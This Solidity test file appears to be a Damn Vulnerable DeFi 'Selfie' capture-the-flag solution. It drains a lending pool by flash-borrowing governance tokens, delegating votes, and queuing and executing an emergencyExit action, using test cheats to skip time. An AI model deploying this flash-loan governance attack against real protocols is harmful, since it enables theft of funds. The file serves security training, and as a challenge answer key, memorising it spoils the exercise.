// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console, Vm} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    Receiver receiver;

    modifier checkSolvedByPlayer() {
        vm.startPrank(address(receiver), player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);
        
        receiver = new Receiver(governance, token, pool);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        uint256 playerBalance;
        uint256 amount = (token.totalSupply() / 2) - playerBalance + 1000;
        bytes memory callData = abi.encodeWithSignature("emergencyExit(address)", receiver);
        token.approve(address(pool), type(uint256).max);
        pool.flashLoan(IERC3156FlashBorrower(address(receiver)), address(token), amount, callData);
        playerBalance = token.balanceOf(address(receiver));

        amount = (token.totalSupply() / 2) - playerBalance + 1000;
        pool.flashLoan(IERC3156FlashBorrower(address(receiver)), address(token), amount, callData);
        playerBalance = token.balanceOf(address(receiver));

        amount = (token.totalSupply() / 2) - playerBalance + 1000;
        pool.flashLoan(IERC3156FlashBorrower(address(receiver)), address(token), amount, callData);
        playerBalance = token.balanceOf(address(receiver));

        uint256 actionid = uint256(vm.load(address(governance), bytes32(uint256(1))));
        governance.queueAction(address(pool), 0 ether, callData);
        vm.warp(block.timestamp + 3 days);
        governance.executeAction(uint256(actionid));

        uint256 wholeReceiverBalance = token.balanceOf(address(receiver));
        token.transfer(recovery, wholeReceiverBalance);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}



contract Receiver is Test {
    SimpleGovernance governance;
    DamnValuableVotes token;
    SelfiePool pool;

    constructor(SimpleGovernance _governance, DamnValuableVotes _token, SelfiePool _pool) {
        governance = _governance;
        token = _token;
        pool = _pool;
    }

    function onFlashLoan(
        address initiator,
        address tokenn,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        token.delegate(address(this));
        uint256 actionid = uint256(vm.load(address(governance), bytes32(uint256(1))));
        governance.queueAction(address(pool), 0 ether, data);
        vm.warp(block.timestamp + 3 days);
        governance.executeAction(uint256(actionid));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }


}
